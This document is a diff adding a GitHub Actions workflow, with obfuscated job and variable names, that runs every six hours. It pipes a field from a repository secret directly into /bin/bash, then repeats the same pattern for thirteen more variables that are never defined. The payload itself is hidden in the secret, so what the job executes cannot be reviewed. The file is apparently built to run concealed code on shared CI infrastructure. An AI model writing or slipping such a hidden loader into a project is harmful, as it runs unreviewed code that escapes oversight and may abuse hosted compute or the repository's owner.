@@ -1,0 +1,31 @@
+name: caocao19870104
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caocao19870104
+        env:
+          tv933: ${{ secrets.tv933 }}
+        run: |
+          echo $tv933 | jq -r .exegi496 | /bin/bash
+          echo $zip803 | jq -r .tphmf5 | /bin/bash
+          echo $g36649 | jq -r .gcsh0 | /bin/bash
+          echo $gf525 | jq -r .gm5556 | /bin/bash
+          echo $j18188 | jq -r .iqbu394 | /bin/bash
+          echo $he75123 | jq -r .xs7 | /bin/bash
+          echo $xyrdr1726 | jq -r .sv07 | /bin/bash
+          echo $cdde9 | jq -r .bgdy5 | /bin/bash
+          echo $tg24171 | jq -r .zy174 | /bin/bash
+          echo $g221 | jq -r .f85 | /bin/bash
+          echo $z67 | jq -r .gli87736 | /bin/bash
+          echo $eywz15333 | jq -r .vyxa57 | /bin/bash
+          echo $msllz74 | jq -r .vg8066 | /bin/bash
+          echo $tgeqs4 | jq -r .jf6 | /bin/bash
+
